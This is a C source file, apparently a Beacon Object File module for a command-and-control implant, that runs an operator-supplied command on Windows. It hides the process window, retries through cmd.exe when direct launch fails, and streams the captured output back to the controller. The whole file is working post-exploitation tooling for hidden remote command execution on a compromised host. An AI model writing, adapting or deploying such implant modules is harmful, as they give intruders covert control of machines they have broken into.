/*
 * exec.o - one-shot command execution (direct CreateProcess, no cmd.exe
 * wrapper unless the program needs it). Output streamed back as POUT_DATA.
 */
#include <windows.h>
#include "../bof.h"

void go(char *args, int length) {
    char *cmd = (char *)b_malloc(length + 1);
    if (!cmd) { b_send(POUT_ERR, "oom", 3); return; }
    memcpy(cmd, args, length);
    cmd[length] = 0;

    HANDLE r1, w1, r2, w2;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&r1, &w1, &sa, 0)) { b_send(POUT_ERR, "pipe1", 5); return; }
    if (!CreatePipe(&r2, &w2, &sa, 0)) {
        CloseHandle(r1); CloseHandle(w1);
        b_send(POUT_ERR, "pipe2", 5); return;
    }
    SetHandleInformation(w1, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(r2, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si; PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = r1; si.hStdOutput = w2; si.hStdError = w2;

    char *cl = (char *)b_malloc(length + 1);
    if (!cl) { b_send(POUT_ERR, "oom", 3); return; }
    memcpy(cl, cmd, length + 1);

    BOOL ok = CreateProcessA(NULL, cl, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                             NULL, NULL, &si, &pi);
    if (!ok) {
        /* retry through cmd.exe (builtins, PATHEXT, etc) */
        DWORD le = GetLastError();
        if (le == ERROR_ACCESS_DENIED || le == ERROR_FILE_NOT_FOUND) {
            int fl = 11 + length + 1;
            char *fb = (char *)b_malloc(fl);
            if (fb) {
                char *p = fb;
                memcpy(p, "cmd.exe /c ", 11); p += 11;
                memcpy(p, cmd, length); p[length] = 0;
                STARTUPINFOA fsi; PROCESS_INFORMATION fpi;
                ZeroMemory(&fsi, sizeof(fsi)); fsi.cb = sizeof(fsi);
                fsi.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
                fsi.wShowWindow = SW_HIDE;
                fsi.hStdInput = r1; fsi.hStdOutput = w2; fsi.hStdError = w2;
                if (CreateProcessA(NULL, fb, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                                   NULL, NULL, &fsi, &fpi)) {
                    ok = TRUE;
                    pi = fpi;
                }
            }
        }
        if (!ok) {
            char eb[256];
            int l = wsprintfA(eb, "CreateProcess failed (%lu): %s\r\n", le, cmd);
            b_send(POUT_ERR, eb, l);
            b_send(POUT_DONE, "", 0);
            return;
        }
    }
    CloseHandle(r1); CloseHandle(w2);

    BYTE *buf = (BYTE *)b_malloc(8192);
    HANDLE hOut = r2;
    DWORD startTick = GetTickCount();
    while (buf) {
        DWORD avail = 0;
        if (PeekNamedPipe(hOut, NULL, 0, NULL, &avail, NULL) && avail > 0) {
            DWORD n;
            if (ReadFile(hOut, buf, 8192, &n, NULL) && n > 0)
                b_send(POUT_DATA, buf, n);
            startTick = GetTickCount();
        } else {
            if (WaitForSingleObject(pi.hProcess, 50) == WAIT_OBJECT_0) {
                DWORD avail2;
                while (PeekNamedPipe(hOut, NULL, 0, NULL, &avail2, NULL) && avail2 > 0) {
                    DWORD n;
                    if (ReadFile(hOut, buf, avail2 > 8192 ? 8192 : avail2, &n, NULL) && n > 0)
                        b_send(POUT_DATA, buf, n);
                }
                break;
            }
            if (GetTickCount() - startTick > 30000) {
                TerminateProcess(pi.hProcess, 0);
                b_send(POUT_ERR, "\r\n[TIMEOUT]\r\n", 13);
                break;
            }
            Sleep(50);
        }
    }
    b_send(POUT_DONE, "", 0);
    CloseHandle(w1); CloseHandle(r2);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
}
